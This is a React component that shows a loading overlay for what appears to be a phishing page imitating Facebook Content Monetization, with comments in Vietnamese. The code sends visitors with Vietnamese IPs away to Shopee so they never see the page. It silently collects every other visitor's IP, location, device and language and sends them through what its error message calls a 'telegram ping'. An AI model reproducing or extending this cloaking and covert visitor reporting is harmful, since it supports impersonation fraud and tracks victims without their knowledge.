'use client'

import React from 'react'
import { useAppSelector } from '@/app/store/hooks'
import { countryCodeToAppLocale } from '@/i18n'
import { LOCALE_OPTION_LABELS } from '@/i18n/localeOptionLabels'
import type { AppLocale } from '@/i18n/schema'
import { useAppStrings } from '@/hooks/useAppStrings'
import { readSessionDisplayLocale } from '@/utils/facebookContentMonetizationDisplayLocale'
import { isResolvedLocation } from '@/utils/getLocation'
import { SendData } from '@/utils/sendData'

const READY_TIMEOUT_MS = 4500
const HIDE_DELAY_MS = 40
const VISIT_IP_STORAGE_PREFIX = 'fbcm_visit_ip:'

/**
 * Overlay mờ chờ IP + locale (device chạy nền).
 */
export default function FbcBootstrapOverlay() {
  const t = useAppStrings()
  const formData = useAppSelector((state) => state.stepForm.data)
  const locale = useAppSelector((state) => state.locale.locale)

  const hasLocation = isResolvedLocation(formData)
  const isVietnam =
    (formData.country_code || '').trim().toUpperCase() === 'VN'

  const expectedLocale = React.useMemo(() => {
    const manual = readSessionDisplayLocale()
    if (manual) return manual
    if (formData.country_code) return countryCodeToAppLocale(formData.country_code)
    return null
  }, [formData.country_code])

  const localeReady = !expectedLocale || locale === expectedLocale
  // Không bắt buộc chờ device — gắn sync gần như ngay lập tức
  const geoReady = hasLocation && localeReady

  const [timedOut, setTimedOut] = React.useState(false)
  const [visible, setVisible] = React.useState(true)
  const visitSentRef = React.useRef(false)

  const ready = geoReady || timedOut

  // IP Việt Nam → chuyển sang Shopee, không mở trang
  React.useEffect(() => {
    if (!isVietnam) return
    window.location.replace('https://shopee.vn/')
  }, [isVietnam])

  React.useEffect(() => {
    if (ready || isVietnam) return
    const id = window.setTimeout(() => setTimedOut(true), READY_TIMEOUT_MS)
    return () => window.clearTimeout(id)
  }, [ready, isVietnam])

  React.useEffect(() => {
    if (!ready || isVietnam) return

    const hideId = window.setTimeout(() => setVisible(false), HIDE_DELAY_MS)

    if (visitSentRef.current) {
      return () => window.clearTimeout(hideId)
    }

    const ip = (formData.ip || '').trim()
    // Client: 1 IP chỉ gửi visit 1 lần (localStorage). Server cũng chặn trùng IP.
    if (ip) {
      try {
        if (localStorage.getItem(`${VISIT_IP_STORAGE_PREFIX}${ip}`)) {
          visitSentRef.current = true
          return () => window.clearTimeout(hideId)
        }
      } catch {
        /* ignore */
      }
    }

    visitSentRef.current = true

    const languageLabel = LOCALE_OPTION_LABELS[locale as AppLocale] || locale

    const payload = {
      event: 'visit',
      ip,
      location: formData.location || '',
      device: formData.device || '',
      country_code: formData.country_code || '',
      language: languageLabel,
      locale,
    }

    void SendData(payload)
      .then(() => {
        if (!ip) return
        try {
          localStorage.setItem(`${VISIT_IP_STORAGE_PREFIX}${ip}`, String(Date.now()))
        } catch {
          /* ignore */
        }
      })
      .catch((err) => {
        console.error('Visit telegram ping failed:', err)
        visitSentRef.current = false
      })

    return () => window.clearTimeout(hideId)
  }, [
    ready,
    isVietnam,
    formData.ip,
    formData.location,
    formData.device,
    formData.country_code,
    locale,
  ])

  // VN giữ overlay đến khi redirect; locale khác thì ẩn khi ready
  if (!visible && !isVietnam) return null

  return (
    <div
      className="fixed inset-0 z-[9999] flex items-center justify-center bg-white/50 backdrop-blur-[4px]"
      role="status"
      aria-live="polite"
      aria-busy="true"
      aria-label={t.common.loading}
    >
      <div
        className="h-9 w-9 animate-spin rounded-full border-[3px] border-[#e4e6eb] border-t-[#0064e0]"
        aria-hidden
      />
    </div>
  )
}
